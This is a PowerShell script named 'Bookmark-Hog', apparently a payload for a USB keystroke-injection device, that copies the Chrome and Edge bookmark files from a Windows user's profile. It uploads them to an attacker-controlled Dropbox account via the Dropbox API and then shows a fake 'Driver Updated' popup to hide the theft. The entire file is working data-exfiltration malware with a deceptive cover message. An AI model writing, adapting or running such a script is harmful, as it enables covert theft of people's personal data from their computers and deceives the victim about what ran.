#Bookmark-Hog

# See if file is a thing
Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -PathType Leaf

#If the file does not exist, write to host.
if (-not(Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -PathType Leaf)) {
     try {
         Write-Host "The chrome bookmark file has not been found. "
     }
     catch {
         throw $_.Exception.Message
     }
 }
 # Copy Chrome Bookmarks to Bash Bunny
  else {
     $F1 = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_chrome_bookmarks.txt"
     Copy-Item "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -Destination "$env:tmp/$F1" 
 }

# See if file is a thing
Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -PathType Leaf

#If the file does not exist, write to host.
if (-not(Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -PathType Leaf)) {
    try {
        Write-Host "The edge bookmark file has not been found. "
    }
    catch {
        throw $_.Exception.Message
    }
}
 # Copy Chrome Bookmarks to Bash Bunny
 else {
    $F2 = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_edge_bookmarks.txt"
    Copy-Item "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -Destination "$env:tmp/$F2" 
}

function DropBox-Upload {

    [CmdletBinding()]
    param (
        
    [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
    [Alias("f")]
    [string]$SourceFilePath
    ) 
    $DropBoxAccessToken = "YOUR ACCESS TOKEN"   # Replace with your DropBox Access Token
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $DropBoxAccessToken
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
    }

DropBox-Upload -f "$env:tmp/$F1"
DropBox-Upload -f "$env:tmp/$F2"

$done = New-Object -ComObject Wscript.Shell;$done.Popup("Driver Updated",1)
